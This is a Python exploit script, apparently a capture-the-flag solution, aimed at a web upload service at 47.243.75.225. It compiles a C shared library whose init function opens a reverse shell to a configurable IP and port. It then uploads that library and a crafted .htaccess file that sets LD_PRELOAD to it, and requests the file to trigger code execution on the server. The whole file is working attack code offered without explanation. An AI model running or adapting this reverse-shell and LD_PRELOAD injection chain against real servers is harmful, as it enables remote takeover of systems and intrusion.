import requests
import subprocess

IP = None
PORT = None


def compile():
    source = f"""
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int foo(){{
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons({PORT});
    revsockaddr.sin_addr.s_addr = inet_addr("{IP}");
    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char * const argv[] = {{"/bin/sh", NULL}};
    execve("/bin/sh", argv, NULL);
    return 0;
}}
void _init() {{
    unsetenv("LD_PRELOAD");
    foo();
}}
    """
    with open("/tmp/test.c", "w") as f:
        f.write(source)
    subprocess.run(
        [
            "gcc",
            "-shared",
            "-fPIC",
            "/tmp/test.c",
            "-nostartfiles",
            "-o",
            "/tmp/test.so",
        ]
    )


def upload(filename, content):
    uid = requests.post(
        "http://47.243.75.225:31337/upload?formid=a",
        files={
            "a": ("a", content),
        },
    )
    print(uid.text)
    requests.post(
        "http://47.243.75.225:31337/upload?formid=a",
        files={"a": (filename, content), "constuctor": ("boo.txt", "boo.txt")},
    )
    return uid.text.split("/")[-2]


print("compiling payload")
compile()
so = upload("hack.so", open("/tmp/test.so", "rb").read())
ht = f"""
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
 SetEnv LD_PRELOAD /var/www/html/{so}/hack.so
 SetOutputFilter 7f39f8317fgzip
</Files>
"""
print("uploading .htaccess")
url = "http://47.243.75.225:31338/" + upload(".htaccess", ht) + "/.htaccess"
requests.get(url)
print("triggering LD_PRELOAD")
print("PWNED?")